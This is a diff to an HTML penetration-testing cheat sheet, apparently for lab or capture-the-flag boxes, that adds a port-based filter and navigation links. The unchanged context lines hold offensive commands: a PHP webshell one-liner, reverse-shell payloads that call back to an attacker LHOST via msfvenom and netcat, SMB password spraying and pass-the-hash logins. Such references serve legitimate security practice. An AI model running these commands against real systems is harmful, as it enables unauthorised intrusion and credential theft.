@@ -49,6 +49,18 @@ a{color:var(--accent)}
 .vfield:focus-within{border-color:var(--accent)}
 .ph{border-radius:3px;padding:0 2px}
 .ph.filled{color:var(--accent);background:rgba(45,212,191,.15)}
+.roles{padding:7px 20px;background:var(--bg);border-bottom:1px solid var(--line);
+  font-family:var(--mono);font-size:11.5px;color:var(--muted)}
+.roles b{color:var(--ink)}
+.roles a{color:var(--accent);text-decoration:none}
+.roles a:hover{text-decoration:underline}
+.focus{display:flex;flex-wrap:wrap;gap:8px;align-items:center;padding:8px 20px;
+  background:var(--surface);border-bottom:1px solid var(--line)}
+.focus .fbtn{font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--elev);
+  border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer}
+.focus .fbtn:hover{color:var(--ink);border-color:var(--faint)}
+.focus .hint{font-family:var(--mono);font-size:10.5px;color:var(--faint);flex:none}
+.filtered{display:none!important}
 
 .layout{max-width:1180px;margin:0 auto;padding:22px 20px 110px;display:grid;
   grid-template-columns:210px minmax(0,1fr);gap:34px;align-items:start}
@@ -90,7 +102,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
 @media (prefers-reduced-motion:reduce){*{transition:none!important}}
 
 @media print{
-  .topnav,.vars,.toc,.block .copy{display:none!important}
+  .topnav,.vars,.focus,.roles,.toc,.block .copy{display:none!important}
   body{background:#fff;color:#111;font-size:10.5pt}
   .layout{display:block;max-width:none;padding:0}
   a{color:#111;text-decoration:none}
@@ -118,6 +130,12 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <button type="button" id="printBtn">print</button>
 </nav>
 
+<div class="roles">
+  <b>Cheat sheet</b> — the essentials, by service.
+  <a href="playbook.html">Playbook</a> to work a box &middot;
+  <a href="arsenal.html">Arsenal</a> to search every command.
+</div>
+
 <div class="vars" aria-label="Target variables">
   <span class="vlabel">fill</span>
   <div class="vfield"><label for="v_IP">IP</label><input id="v_IP" placeholder="10.10.10.10" autocomplete="off"></div>
@@ -127,6 +145,14 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <div class="vfield"><label for="v_LHOST">LHOST</label><input id="v_LHOST" placeholder="tun0 IP" autocomplete="off"></div>
   <div class="vfield"><label for="v_LPORT">LPORT</label><input id="v_LPORT" placeholder="443" autocomplete="off"></div>
   <span class="hint">set once — shared with the playbook &amp; arsenal, fills the commands below</span>
+</div>
+
+<div class="focus" aria-label="Focus on your open ports">
+  <span class="vlabel">focus</span>
+  <div class="vfield" style="flex:1 1 220px"><label for="ports">open ports</label><input id="ports" placeholder="22,80,445 — collapse to just these services" autocomplete="off"></div>
+  <button type="button" class="fbtn" id="useScan">use my scan</button>
+  <button type="button" class="fbtn" id="clearFocus">show all</button>
+  <span class="hint" id="focusHint"></span>
 </div>
 
 <div class="layout">
@@ -164,24 +190,24 @@ ident-user-enum $IP 22 80 113 3306
 knock $IP 7469 8475 9842 &amp;&amp; ssh &lt;user&gt;@$IP
 for p in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $p $IP; done      # no knock client needed</code></pre></div>
 <hr>
-<h2 id="ftp-21">FTP (21)</h2>
+<h2 id="ftp-21" data-ports="21">FTP (21)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p21 --script ftp-anon,ftp-syst $IP
 ftp $IP                       # user: anonymous  pass: anything
 # inside ftp:  binary   |   prompt off   |   mget *   |   put &lt;file&gt;
 wget -r ftp://anonymous:anon@$IP/     # pull everything</code></pre></div>
-<h2 id="ssh-22">SSH (22)</h2>
+<h2 id="ssh-22" data-ports="22">SSH (22)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p22 --script ssh-auth-methods,ssh2-enum-algos $IP
 ssh &lt;user&gt;@$IP
 ssh -i id_rsa &lt;user&gt;@$IP      # with a found key (chmod 600 id_rsa first)
 ssh2john id_rsa &gt; hash        # crack an encrypted key</code></pre></div>
-<h2 id="smtp-25">SMTP (25)</h2>
+<h2 id="smtp-25" data-ports="25">SMTP (25)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p25 --script smtp-commands,smtp-enum-users $IP
 smtp-user-enum -M VRFY -U users.txt -t $IP</code></pre></div>
-<h2 id="dns-53">DNS (53)</h2>
+<h2 id="dns-53" data-ports="53">DNS (53)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>dig axfr @$IP &lt;domain&gt;        # zone transfer
 dnsrecon -d &lt;domain&gt; -n $IP
 nslookup                      # then: server $IP  -&gt;  &lt;domain&gt;</code></pre></div>
-<h2 id="web-80-443-8080">Web (80/443/8080/...)</h2>
+<h2 id="web-80-443-8080" data-ports="80,443,3000,5000,8000,8080,8443,8888">Web (80/443/8080/...)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>whatweb -a3 http://$IP
 curl -sSik http://$IP/robots.txt
 nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP
@@ -244,7 +270,7 @@ echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; cmd.php    
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp &lt;port&gt;, browse it
 msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php  # command-runner, does NOT upgrade to a TTY -- prefer php-reverse-shell.php above</code></pre></div>
 <p>Reminder: if the browser redirects to a name, <code>echo "$IP &lt;host&gt;" | sudo tee -a /etc/hosts</code>.</p>
-<h2 id="smb-139-445">SMB (139/445)</h2>
+<h2 id="smb-139-445" data-ports="139,445">SMB (139/445)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nxc smb $IP                                   # OS / domain / signing
 nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --shares              # null session
 nxc smb $IP -u guest -p &#x27;&#x27; --shares
@@ -257,15 +283,15 @@ smbclient //$IP/&lt;share&gt; -N -c &#x27;recurse ON; ls&#x27; # walk a share
 
 # password spray / cred check across a subnet
 nxc smb $IP -u users.txt -p &#x27;Password1&#x27; --continue-on-success</code></pre></div>
-<h2 id="snmp-161-udp">SNMP (161/udp)</h2>
+<h2 id="snmp-161-udp" data-ports="161">SNMP (161/udp)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
 snmpwalk -v2c -c public $IP
 snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2   # running processes</code></pre></div>
-<h2 id="ldap-389-636">LDAP (389/636)</h2>
+<h2 id="ldap-389-636" data-ports="389,636">LDAP (389/636)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nmap -p389 --script ldap-rootdse $IP
 ldapsearch -x -H ldap://$IP -s base -b &#x27;&#x27; namingContexts
 ldapsearch -x -H ldap://$IP -b &#x27;&lt;baseDN&gt;&#x27; &gt; ldap_dump.txt</code></pre></div>
-<h2 id="databases">Databases</h2>
+<h2 id="databases" data-ports="1433,1521,3306,5432,6379,9200,11211,27017">Databases</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># MSSQL 1433
 impacket-mssqlclient &lt;user&gt;:&lt;pass&gt;@$IP            # add -windows-auth for domain
 # MySQL 3306
@@ -274,12 +300,12 @@ mysql -h $IP -u root -p
 psql -h $IP -U postgres
 # Redis 6379
 redis-cli -h $IP        # then: info | keys * | config get dir</code></pre></div>
-<h2 id="rdp-winrm">RDP / WinRM</h2>
+<h2 id="rdp-winrm" data-ports="3389,5985,5986">RDP / WinRM</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>xfreerdp /v:$IP /u:&lt;user&gt; /p:&lt;pass&gt; +clipboard /dynamic-resolution
 nxc winrm $IP -u &lt;user&gt; -p &lt;pass&gt;
 evil-winrm -i $IP -u &lt;user&gt; -p &lt;pass&gt;
 evil-winrm -i $IP -u &lt;user&gt; -H &lt;ntlm-hash&gt;       # pass-the-hash</code></pre></div>
-<h2 id="active-directory-88-present-dc">Active Directory (88 present = DC)</h2>
+<h2 id="active-directory-88-present-dc" data-ports="88">Active Directory (88 present = DC)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># GPP cpassword pulled from a share by hand (e.g. null-session Replication share)
 gpp-decrypt &#x27;&lt;cpassword&gt;&#x27;                      # AES key is public; recovers the plaintext
 nxc ldap $IP -u &lt;user&gt; -p &lt;pass&gt; --laps        # local-admin pw off the computer object
@@ -545,6 +571,42 @@ searchsploit -x &lt;id&gt;          # view it</code></pre></div>
     },{rootMargin:"-60px 0px -75% 0px"});
     heads.forEach(function(h){io.observe(h);});
   }
+
+  // ---- focus: collapse to the services on this box's open ports ----
+  var tocById={}; links.forEach(function(a){tocById[a.getAttribute('href').slice(1)]=a;});
+  var portsInput=document.getElementById('ports');
+  var focusHint=document.getElementById('focusHint');
+  var docEl=document.getElementById('doc');
+  function parsePorts(str){var set=new Set();(String(str).match(/\d+/g)||[]).forEach(function(n){set.add(+n);});return set;}
+  function applyFocus(){
+    var set=parsePorts(portsInput.value), active=set.size>0, shown=0,total=0, hideCur=false;
+    [].forEach.call(docEl.children,function(el){
+      if(el.tagName==='H2'){
+        var dp=el.getAttribute('data-ports');
+        if(!active||!dp){hideCur=false;}                 // universal section, or no filter set
+        else{total++;var sp=dp.split(',').map(Number);hideCur=!sp.some(function(p){return set.has(p);});if(!hideCur)shown++;}
+        el.classList.toggle('filtered',hideCur);
+        var link=tocById[el.id]; if(link) link.classList.toggle('filtered',hideCur);
+      } else {
+        el.classList.toggle('filtered',hideCur);
+      }
+    });
+    focusHint.textContent = active ? (shown+' of '+total+' services — plus the universal sections') : '';
+    try{ if(active) localStorage.setItem('cheat:ports',portsInput.value); else localStorage.removeItem('cheat:ports'); }catch(_){}
+  }
+  portsInput.addEventListener('input',applyFocus);
+  document.getElementById('clearFocus').addEventListener('click',function(){portsInput.value='';applyFocus();portsInput.focus();});
+  document.getElementById('useScan').addEventListener('click',function(){
+    try{
+      var v=JSON.parse(localStorage.getItem('toolkit:vars')||'{}')||{};
+      var box=v.BOX||'_default';
+      var scan=JSON.parse(localStorage.getItem('scan2:'+box)||'[]')||[];
+      var ports=scan.map(function(p){return p.port;}).filter(Boolean);
+      if(!ports.length){focusHint.textContent='no saved scan — paste an nmap into the playbook\'s planner first';return;}
+      portsInput.value=ports.join(','); applyFocus();
+    }catch(_){ focusHint.textContent='could not read your scan'; }
+  });
+  try{var saved=localStorage.getItem('cheat:ports'); if(saved){portsInput.value=saved; applyFocus();}}catch(_){}
 })();
 </script>
 </body>
